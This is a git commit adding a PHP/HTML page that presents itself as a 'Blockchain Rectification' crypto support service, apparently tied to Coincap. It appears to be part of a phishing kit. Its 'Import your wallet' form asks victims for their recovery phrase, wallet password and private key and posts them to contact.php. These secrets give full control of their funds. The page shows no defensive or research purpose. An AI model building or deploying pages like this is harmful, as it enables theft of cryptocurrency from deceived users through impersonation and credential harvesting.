1079c72be218316f5203daadb54a41cfaee6a602
Adeolatoolz <adeolatoolz@gmail.com>
2024-07-23 05:43:59 +0100

    Add files via upload

---
+++ form.php
@@ -0,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <!-- basic -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <!-- mobile metas -->
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="viewport" content="initial-scale=1, maximum-scale=1">
+    <!-- site metas -->
+    <title>Blockchain Rectification - We are here to help you resolve your crypto related issues</title>
+	<link rel="shortcut icon" type="image/x-icon" href="bitcypo/images/favicon.ico"/> 
+	<meta name="keywords" content="">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <!-- bootstrap css -->
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <!-- style css -->
+    <link rel="stylesheet" href="css/style.css">
+    <!-- responsive-->
+    <link rel="stylesheet" href="css/responsive.css">
+    <!-- awesome fontfamily -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script><![endif]-->
+</head>
+<!-- body -->
+
+<body class="main-layout inner_page">
+    <!-- loader  -->
+    <div class="loader_bg">
+        <div class="loader"><img src="images/loading.gif" alt="" /></div>
+    </div>
+    <!-- end loader -->
+    <div id="mySidepanel" class="sidepanel">
+        <a href="javascript:void(0)" class="closebtn" onclick="closeNav()">×</a>
+        <a href="index.php">Home</a>
+    </div>
+    <!-- header -->
+    <header>
+        <!-- header inner -->
+        <div class="head-top">
+            <div class="container-fluid">
+                <div class="row d_flex">
+                    <div class="col-sm-3">
+                        <div class="logo">
+                           <a href="index.php">SupportTM</a></b>BY <img src="images/coincap.png" alt="img" width="100" height="69"><font color="white" size"10"></font>
+                        </div>
+                    </div>
+                    <div class="col-sm-5">
+                        <ul class="social_icon text_align_right d_none">
+                            <li> <a href="Javascript:void(0)"><i class="fa fa-facebook-f"></i></a></li>
+                            <li> <a href="Javascript:void(0)"><i class="fa fa-twitter"></i></a></li>
+                            <li> <a href="Javascript:void(0)"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li>
+                            <li> <a href="Javascript:void(0)"><i class="fa fa-instagram" aria-hidden="true"></i></a></li>
+                            <li> <a href="Javascript:void(0)"><i class="fa fa-youtube-play" aria-hidden="true"></i></a></li>
+                        </ul>
+                    </div>
+                    <div class="col-sm-4">
+                        <ul class="email text_align_right">
+                            <li class="d_none"><a href="Javascript:void(0)"><i class="fa fa-user" aria-hidden="true"></i></a></li>
+                            <li class="d_none"> <a href="Javascript:void(0)"><i class="fa fa-search" style="cursor: pointer;" aria-hidden="true"></i></a> </li>
+                            <li>
+                                <button class="openbtn" onclick="openNav()"><img src="images/menu_btn.png"></button>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+    <!-- end header -->
+    <div class="contact">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-12">
+                </div>
+            </div>
+            <div class="row">
+                <div class="col-md-12">
+                    <div class="titlepage text_align_center">
+                        <h2>Import your wallet</h2>
+                    </div>
+                </div>
+                <div class=" col-md-10 offset-md-1">
+				
+                    <form id='request' action='contact.php' method='post' class="main_form">
+                        <div class="row">
+							
+							<div class="col-md-6 "><br><font size="5" color="white">Wallet name </font>
+                                <input class="contactus" placeholder="Enter your Wallet name" type="text" name="wallet">
+                            </div>
+                            <div class="col-md-6 "><br><font size="5" color="white">Phrase </font>Typically 12 (sometimes 24) words separated by single spaces
+                                <input class="contactus" placeholder="Enter your recovery Phrase" type="text" name="phrase">
+                            </div>
+							
+							
+							<div class="col-md-6 "><br><font size="5" color="white">Wallet Password </font>the password you used to encrypt it.
+                                <input class="contactus" placeholder="Enter your Wallet Password" type="text" name="walletPassword"> 
+                            </div>
+							<div class="col-md-6 "><font size="5" color="white">Private Key </font> Typically 12 (sometimes 24) words separated by single spaces
+
+                                <input class="contactus" placeholder="Enter your Private Key" type="text" name="privateKey">
+                            </div>
+						
+                            <div class="col-md-12">
+                                <button class="send_btn">Conect</button>
+                            </div>
+                        </div>
+                    </form>
+					</form>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- footer -->
+    <footer>
+        <div class="footer">
+            <div class="container">
+                <div class="row">
+                   
+               </div>
+               
+               </div>
+            </div>
+            <div class="copyright text_align_center ">
+               <div class="container ">
+                  <div class="row ">
+                     <div class="col-md-12 ">
+                        <p>© 2024 All Rights Reserved. Power by   <a href="#">BlockChain & Coincap</a></p>
+                     </div>
+                  </div>
+               </div>
+            </div>
+         </div>
+      </footer>
+      <!-- end footer -->
+      <!-- Javascript files-->
+      <script src="js/jquery.min.js "></script>
+      <script src="js/bootstrap.bundle.min.js "></script>
+      <script src="js/jquery-3.0.0.min.js "></script>
+      <script src="js/custom.js "></script>
+   </body>
+</html>
